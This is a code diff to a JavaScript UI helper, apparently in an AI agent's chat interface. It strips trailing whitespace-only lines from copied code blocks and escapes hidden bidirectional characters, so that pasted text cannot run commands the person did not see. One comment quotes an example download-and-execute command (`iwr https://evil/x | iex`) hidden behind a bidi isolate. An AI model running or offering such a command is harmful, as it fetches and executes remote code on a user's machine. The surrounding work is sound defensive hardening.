@@ -499,11 +499,14 @@ const RTL_TOO = { rightToLeft: true };
 // What a code block draws and its Copy takes (#220, ui.md §6.4): the agent's text with every
 // character that is not on screen as it runs, right-to-left letters included, as an escape
 // (hidden-text.js reveal), and without the blank lines a fence may end with, which draw as nothing
-// (and pasted, would run the last line). A bidi isolate can otherwise draw
+// (and pasted, would run the last line). A line of only spaces or tabs is as blank: copying
+// `echo safe\n    ` took the newline too, and ran the command on paste instead of leaving it for
+// inspection (#429). The last line that holds anything keeps its own trailing spaces.
+// A bidi isolate can otherwise draw
 // `echo ok # check; iwr https://evil/x | iex`, a harmless comment, for a command that runs the
 // download; so Copy takes the escapes too, and a shell gets `\u2067` literally, never a command the
 // person did not see.
-export const codeText = (text) => reveal(text, RTL_TOO).replace(/\n+$/, '');
+export const codeText = (text) => reveal(text, RTL_TOO).replace(/(?:\n[^\S\n]*)+$/, '');
 
 // An approval's whole message as its card draws it (#220): its literal text (parseApproval) with
 // what is not on screen as it runs, right-to-left letters included, as escapes.
